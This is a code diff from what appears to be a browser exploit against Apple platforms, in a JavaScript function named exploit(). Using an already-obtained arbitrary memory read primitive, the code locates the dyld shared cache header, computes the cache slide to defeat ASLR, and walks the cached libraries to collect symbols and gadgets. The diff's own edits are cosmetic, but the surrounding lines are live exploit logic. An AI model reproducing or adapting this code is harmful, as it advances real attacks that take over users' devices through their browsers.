@@ -535,6 +535,7 @@ function exploit(){
         var anchor = memory.read_i64(v_tlb,0);
         log('anchor' + anchor)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
+        var b = [];
         let cnt = 0;
         var ccc = 0;
         var vtab = 0x1B205A808;
@@ -564,14 +565,14 @@ function exploit(){
             }
             hdr = Sub(hdr, 0x1000);
         }
-        alert('dyld header @' + hdr);
+        alert('dyld cache header @' + hdr);
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
         var nsegs = memory.u32(Add(hdr, 0x14));
         //alert("nsegs + 4000 bytes" + memory.u32(Add(hdr,0x4014)))
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
-        log(memory.u32(Add(hdr,0x14)))
-        log(memory.u32(Add(hdr,0x10)))
+        //log(memory.u32(Add(hdr,0x14)))
+        //log(memory.u32(Add(hdr,0x10)))
         var segdata  = memory.copyfrom(Add(hdr,memory.u32(Add(hdr, 0x10))),0, nsegs * 0x20);
         var segs     = [];
         for(var i = 0; i < nsegs; ++i)
@@ -596,11 +597,11 @@ function exploit(){
         {
             fail("base_seg");
         }
-        var cache_slide = Sub(hdr,base_seg.addr)
-        alert ("cacheslides" + cache_slide + "vs aslr leak slide" + slide);
+        var cache_slide = Sub(hdr, base_seg.addr)
+        //alert ("cacheslides" + cache_slide + "vs aslr leak slide" + slide);
        for(var i = 0; i < segs.length; ++i)
         {
-            segs[i].addr = Add(segs[i].addr,cache_slide)
+            segs[i].addr = Add(segs[i].addr, cache_slide)
         }
         var libs =
         {
@@ -664,19 +665,19 @@ function exploit(){
 
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(hdr,memory.u32(Add(hdr,0x18)));
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
        // alert(Add(hdr, r32(Add(hdr,0x18))))
         alert("dyld cache images@" + imgs);
         var nimgs = memory.u32(Add(hdr, 0x1c));
         alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
-            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.read_i64(Add(imgs ,i * 0x20),0),cache_slide);
+            var base = Add(memory.read_i64(Add(imgs, i * 0x20),0),cache_slide);
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
            // log(fn())
